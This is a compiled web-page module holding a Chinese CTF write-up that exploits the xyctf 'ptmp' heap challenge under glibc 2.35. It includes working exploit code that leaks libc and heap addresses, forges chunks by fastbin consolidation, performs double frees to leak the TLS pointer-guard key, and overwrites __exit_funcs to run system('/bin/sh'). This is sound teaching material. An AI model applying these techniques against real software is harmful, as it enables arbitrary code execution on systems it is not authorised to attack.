import{_ as e}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as o,o as c,c as i,a as n,b as s,d as p,e as t}from"./app-4DI25i_s.js";const u={},l=t('<h1 id="xyctf-ptmp的做题记录-glibc2-35下的exit函数打法" tabindex="-1"><a class="header-anchor" href="#xyctf-ptmp的做题记录-glibc2-35下的exit函数打法" aria-hidden="true">#</a> xyctf ptmp的做题记录(glibc2.35下的exit函数打法)</h1><h2 id="审题" tabindex="-1"><a class="header-anchor" href="#审题" aria-hidden="true">#</a> 审题</h2><ul><li><p>add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418005442527.png" alt="image-20240418005442527" tabindex="0" loading="lazy"><figcaption>image-20240418005442527</figcaption></figure></li><li><p>delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418005502800.png" alt="image-20240418005502800" tabindex="0" loading="lazy"><figcaption>image-20240418005502800</figcaption></figure></li><li><p>view函数 直接write出size大小的内容 存在泄露</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418005523801.png" alt="image-20240418005523801" tabindex="0" loading="lazy"><figcaption>image-20240418005523801</figcaption></figure></li><li><p>atexit函数</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418131700409.png" alt="image-20240418131700409" tabindex="0" loading="lazy"><figcaption>image-20240418131700409</figcaption></figure></li></ul><h2 id="大致利用原理" tabindex="-1"><a class="header-anchor" href="#大致利用原理" aria-hidden="true">#</a> 大致利用原理:</h2><blockquote><p>这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调</p></blockquote>',5),k=n("li",null,[n("p",null,"泄露libc heap地址"),n("ul",null,[n("li",null,"通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址")])],-1),r=n("li",null,[n("p",null,"伪造fake chunk（消耗topchunk触发fastbin的合并）"),n("blockquote",null,[n("p",null,"或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin")]),n("ul",null,[n("li",null,[s("因为题目中存在isUsed 有了这个就阻止了我们"),n("code",null,"double free"),s("所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free")])])],-1),d=n("p",null,"劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表",-1),b={href:"https://www.anquanke.com/post/id/243196",target:"_blank",rel:"noopener noreferrer"},m={href:"https://bbs.kanxue.com/thread-280518.htm#msg_header_h2_1",target:"_blank",rel:"noopener noreferrer"},h=n("p",null,"这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式",-1),g=t(`<h2 id="泄露libc-heap" tabindex="-1"><a class="header-anchor" href="#泄露libc-heap" aria-hidden="true">#</a> 泄露libc heap</h2><blockquote><p>最简单的一步</p></blockquote><p>简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 泄露出chunk</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1936</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">2206944</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>chunk进入unsortedbin</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418132947766.png" alt="image-20240418132947766" tabindex="0" loading="lazy"><figcaption>image-20240418132947766</figcaption></figure></li><li><p>free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418133015055.png" alt="image-20240418133015055" tabindex="0" loading="lazy"><figcaption>image-20240418133015055</figcaption></figure></li><li><p>申请回来</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418133239908.png" alt="image-20240418133239908" tabindex="0" loading="lazy"><figcaption>image-20240418133239908</figcaption></figure></li><li><p>然后write直接泄露即可</p></li></ul><h2 id="伪造fake-chunk" tabindex="-1"><a class="header-anchor" href="#伪造fake-chunk" aria-hidden="true">#</a> 伪造fake chunk</h2><blockquote><p>最消耗时间的一步</p></blockquote><ul><li>这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为<code>头chunk </code>记录<code>内容chunk</code>的size isUsed point</li><li><code>point</code>指向的就是<code>内容chunk</code></li></ul><p>为了绕过isUsed的检测 我们可以利用<code>delete</code>后没有清空的特性将原本的<code>头chunk</code>覆盖掉 这样就能随意控制<code>isUsed</code>和<code>point</code>了 实现任意free 所以我们选择触发<code>fastbin的合并</code> 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制<code>内容chunk</code>刚好为原本某一个的<code>头chunk</code></p><h3 id="示意图" tabindex="-1"><a class="header-anchor" href="#示意图" aria-hidden="true">#</a> 示意图</h3><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418134333731.png" alt="image-20240418134333731" tabindex="0" loading="lazy"><figcaption>image-20240418134333731</figcaption></figure><ul><li>这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了</li></ul><h3 id="fastbin合并机制" tabindex="-1"><a class="header-anchor" href="#fastbin合并机制" aria-hidden="true">#</a> fastbin合并机制</h3><ul><li><p>范围:2.35</p><ul><li>我们可以通过申请large bin chunk 来触发合并</li><li>我们可以通过让topchunk消耗完毕 然后触发合并</li></ul></li><li><p>由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk</p><blockquote><p>Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式</p></blockquote></li><li><p>连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># tcache 0x20 0x90均存满</span>
<span class="token comment"># 剩下0xf3c7d0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">760</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>
<span class="token comment"># 防止fastbin合并后直接被topchunk合并 </span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>合并之前</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418151026231.png" alt="image-20240418151026231" tabindex="0" loading="lazy"><figcaption>image-20240418151026231</figcaption></figure></li><li><p>合并后</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418151102406.png" alt="image-20240418151102406" tabindex="0" loading="lazy"><figcaption>image-20240418151102406</figcaption></figure></li></ul><h3 id="构造fakecchunk" tabindex="-1"><a class="header-anchor" href="#构造fakecchunk" aria-hidden="true">#</a> 构造fakecchunk</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>fakechunk <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">//</span> 为触发泄露tls<span class="token operator">+</span><span class="token number">0x30</span>的double free的fastbinchunk地址
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span>
<span class="token comment"># 已经完成覆写 free index5则可实现任意free</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>此时index为5 就是我们劫持的<code>头chunk</code> 这里的fd就是我们后面要free的任意chunk</p><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418151731938.png" alt="image-20240418151731938" tabindex="0" loading="lazy"><figcaption>image-20240418151731938</figcaption></figure></li></ul><h2 id="泄露tls-0x30" tabindex="-1"><a class="header-anchor" href="#泄露tls-0x30" aria-hidden="true">#</a> 泄露tls+0x30</h2><blockquote><p>由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域</p></blockquote><ul><li><p>难点</p><ul><li>我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大</li><li>实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc</li><li>glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap&gt;&gt;12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差</li></ul></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># 构造一个double free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token comment"># 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">-</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># 泄露tls中信息</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>__builtin_expect<span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	malloc_printerr<span class="token punctuation">(</span><span class="token string">&quot;double free or corruption (fasttop)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">=</span> PROTECT_PTR<span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-</span><span class="token operator">&gt;</span>fd<span class="token punctuation">,</span> old<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">*</span>fb <span class="token operator">=</span> p<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240420123457567.png" alt="image-20240420123457567" tabindex="0" loading="lazy"><figcaption>image-20240420123457567</figcaption></figure><ul><li><p>然后将利用开始构造好的fakechunk进行free</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240420123602766.png" alt="image-20240420123602766" tabindex="0" loading="lazy"><figcaption>image-20240420123602766</figcaption></figure></li></ul><h3 id="fd加密机制" tabindex="-1"><a class="header-anchor" href="#fd加密机制" aria-hidden="true">#</a> fd加密机制</h3><blockquote><p>glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可</p></blockquote><ul><li>fd需要是heap基地址^目标地址</li></ul><h2 id="劫持exit-funcs链表" tabindex="-1"><a class="header-anchor" href="#劫持exit-funcs链表" aria-hidden="true">#</a> 劫持exit_funcs链表</h2><blockquote><p>最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写</p><p>本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来</p></blockquote><ul><li>难点 <ul><li>因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了</li></ul></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>
<span class="token comment"># size: 0x20c30</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">758</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add_with_no_chunk<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 将topchunk消耗空触发合并</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

<span class="token comment"># 指定free index 6 可以实现任意free</span>
<span class="token comment"># free_chunk就是后续构造double free的chunk地址</span>
free_chunk <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">271376</span><span class="token operator">+</span><span class="token number">0x10</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 触发double free</span>
delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment"># 将fd指向exit_function地址处</span>
add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">+</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">^</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># 获取key的值</span>
res <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token comment"># 计算出key加密后的地址</span>
manba <span class="token operator">=</span> remove_high_digits<span class="token punctuation">(</span>rol<span class="token punctuation">(</span><span class="token number">0x401700</span><span class="token operator">^</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> remove_high_digits<span class="token punctuation">(</span>rol<span class="token punctuation">(</span>system_addr<span class="token operator">^</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;heap_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_function:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42420</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;5&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
